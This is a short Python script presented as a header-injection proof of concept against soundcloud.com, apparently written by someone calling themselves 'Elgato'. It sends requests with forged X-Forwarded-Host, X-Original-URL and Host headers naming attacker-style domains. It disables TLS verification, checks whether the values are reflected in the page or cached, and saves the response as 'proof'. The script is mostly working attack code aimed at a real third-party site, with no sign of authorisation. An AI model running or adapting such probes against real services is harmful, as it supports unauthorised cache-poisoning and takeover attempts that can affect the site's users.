#!/usr/bin/env python3
"""
Elgato Security Labs - SoundCloud Header Injection PoC
Author: You (Elgato)
Target: https://soundcloud.com
"""

import requests
import urllib3
urllib3.disable_warnings()

TARGET = "https://soundcloud.com/"
HEADERS = [
    {"X-Forwarded-Host": "elgato-is-here.com"},
    {"X-Original-URL": "/elgato-takeover"},
    {"Host": "elgato-security.com"}
]

print("ELGATO IS HERE - Testing Headers...\n")

for h in HEADERS:
    name = list(h.keys())[0]
    try:
        r = requests.get(TARGET, headers=h, verify=False, timeout=10)
        reflected = h[name].lower() in r.text.lower()
        cache = r.headers.get("x-cache", "N/A")
        print(f"{name}: {h[name]}")
        print(f"   Status: {r.status_code} | Cache: {cache} | Reflected: {reflected}\n")
    except:
        print(f"{name}: Failed\n")

# ذخیره خروجی
with open("elgato_proof.html", "w", encoding="utf-8") as f:
    r = requests.get(TARGET, headers={"X-Forwarded-Host": "elgato-is-here.com"}, verify=False)
    f.write(r.text)
print("PoC saved: elgato_proof.html")